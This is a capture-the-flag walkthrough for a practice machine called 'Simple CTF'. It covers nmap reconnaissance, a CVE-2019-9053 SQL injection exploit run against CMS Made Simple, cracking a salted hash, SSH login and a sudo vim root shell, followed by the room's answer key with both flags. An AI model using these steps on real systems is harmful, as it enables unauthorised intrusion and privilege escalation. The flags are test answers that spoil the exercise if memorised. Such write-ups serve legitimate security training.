<p style="font-size: 40px; font-weight: bold; text-decoration: none">Simple CTF</p>

<br>

<h2 style="font-size: 30px;"> Steps: </h2>

<br>

## 1 - Use Nmap to scan the target and save the log in a new directory:

Command:
```
mkdir nmap  
nmap -sC -sV -oN nmap/initial 10.10.149.90
```
<h3 style="margin-top: 30px; font-size: 20px">Nmap log:</h3>

<pre><code style="color: rgb(60, 175, 31); font-size: 12px">
# Nmap 7.94SVN scan initiated Wed Feb 19 22:11:27 2025 as: nmap -sC -sV -oN nmap/initial 10.10.10.10
Nmap scan report for 10.10.10.10
Host is up (0.33s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff: 10.0.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 19 22:12:33 2025 -- 1 IP address (1 host up) scanned in 66.37 seconds
</code></pre>

## Nmap Scan Report

**Scan initiated on:** Wed Feb 19 22:11:27 2025  
**Command used:** `nmap -sC -sV -oN nmap/initial 10.10.10.10`  

---

## Target Information

**IP Address:** 10.10.10.10  
**Host State:** Up (0.33s latency)  
**Filtered Ports:** 997 filtered (no-response)  

---

## Open Ports and Services

| Port     | State | Service | Version                                      |
| -------- | ----- | ------- | -------------------------------------------- |
| 21/tcp   | Open  | FTP     | vsftpd 3.0.3                                 |
| 80/tcp   | Open  | HTTP    | Apache httpd 2.4.18 (Ubuntu)                 |
| 2222/tcp | Open  | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |

---

## Additional Information

### Port 21 (FTP)
- **Anonymous Login:** Allowed (`230` FTP code)  
- **FTP System Status:**  
  - Connected to `::ffff:10.0.0.1`  
  - Logged in as `ftp`  
  - No session bandwidth limit  
  - Session timeout: `300` seconds  
  - Control connection: Plain text  
  - Data connections: Plain text  
  - FTP server: `vsFTPd 3.0.3 - secure, fast, stable`  

### Port 80 (HTTP)
- **Server Header:** Apache/2.4.18 (Ubuntu)  
- **Title:** Apache2 Ubuntu Default Page: It works  
- **robots.txt:**  
  - Disallowed entries: `/openemr-5_0_1_3`  

### Port 2222 (SSH)
- **Host Key:**  
  - RSA: `29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23`  
  - ECDSA: `9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c`  
  - ED25519: `12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6`  

---

**Nmap Scan Completed:** Wed Feb 19 22:12:33 2025  
**Time Elapsed:** 66.37 seconds  
**Scanned Hosts:** 1 IP address  
**Incorrect Results:** [Report Here](https://nmap.org/submit/)  

<br><br>

## 2. Identify open ports up to 1000  
Determine how many ports are open up to port 1000: 2 (21, 80).

<br><br>

## 3. Find the CMS version  
Analyze the HTML source code at `http://10.10.10.10/simple/` to identify the CMS version:  
**CMS Made Simple v2.2.8**  

<br><br>

## 4. Identify the CVE  
Find the associated vulnerability: **CVE-2019-9053**  

<br><br>

## 5. Exploit the vulnerability  

- Copy the exploit script to the CTF directory.  
- Edit the script to remove the `termcolor` function.  
- Use the Python exploit from **searchsploit 46635**:  
<br>

Command:
```
python2 46635.py -u http://10.10.10.10/simple/
```
<br>

Result:
```
[+] Salt for password found: 1dac0d92e9fa6bb2   
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

<br>

- Use a hash decryption site like [dcode.fr](https://www.dcode.fr/hash-function) to decrypt the hash using:  
  - **Salt:** `1dac0d92e9fa6bb2`  
  - **Password hash:** `0c01f4468bd75d7a84c7eb73846e8d96`  
  - **Decrypted password:** `secret`  

### Vulnerability:
- **Type:** SQLi  
- **Password:** `secret`  

<br><br>

## 6. Gain SSH access
Use the obtained credentials to log in via SSH on port 2222:  
<br>
Command:
```
ssh mitch@10.10.10.10 -p 2222
```

<br><br>

## 7. Capture the user flag
Check the system files with `ls -la` and capture user.txt.

<br><br>

## 8. Identify other users
Navigate to /home to check for additional users.

- **second user:** sunbash

<br><br>

## 9. Find sudo privileges
Navigate to the root directory with `cd /`
<br>
Check for files with sudo privileges using `sudo -l`
The output reveals vim can be used with sudo.

<br><br>

## 10. Escalate to root
Use the following command on the target machine to gain root privileges:  
<br>
Command:
```
sudo vim -c ':!/bin/sh'
```
<br>

Check if the privilege escalation was successful with `whoami`: The output should be root.

<br><br>

## 11. Capture the root flag
Navigate to the root directory:
<br>
Command:
```
cd /root
```
<br>

List the files:
<br>
Command:
```
ls -la
```
<br>

Find and capture the root flag:
<br>
Command:
```
cat root.txt
```
<br>

[+] Root flag captured!

<br><br>

<h2 style="font-size: 30px;"> Questions: </h2>

- **How many services are running under port 1000?** <p style="font-style: italic; color: rgb(60, 175, 31);"> 2 <p>

---

- **What is running on the higher port?** <p style="font-style: italic; color: rgb(60, 175, 31);"> ssh <p>

---

- **What's the CVE you're using against the application?** <p style="font-style: italic; color: rgb(60, 175, 31);"> CVE-2019-9053 <p>

---

- **To what kind of vulnerability is the application vulnerable?** <p style="font-style: italic; color: rgb(60, 175, 31);"> sqli <p>

---

- **What's the password?** <p style="font-style: italic; color: rgb(60, 175, 31);"> secret <p>

---

- **Where can you login with the details obtained?** <p style="font-style: italic; color: rgb(60, 175, 31);"> ssh <p>

---

- **What's the user flag?** <p style="font-style: italic; color: rgb(60, 175, 31);"> G00d j0b, keep up! <p>

---

- **Is there any other user in the home directory? What's its name?** <p style="font-style: italic; color: rgb(60, 175, 31);"> sunbath <p>

---

- **What can you leverage to spawn a privileged shell?** <p style="font-style: italic; color: rgb(60, 175, 31);"> vim <p>

---

- **What's the root flag?** <p style="font-style: italic; color: rgb(60, 175, 31);"> W3ll d0n3. You made it! <p>

---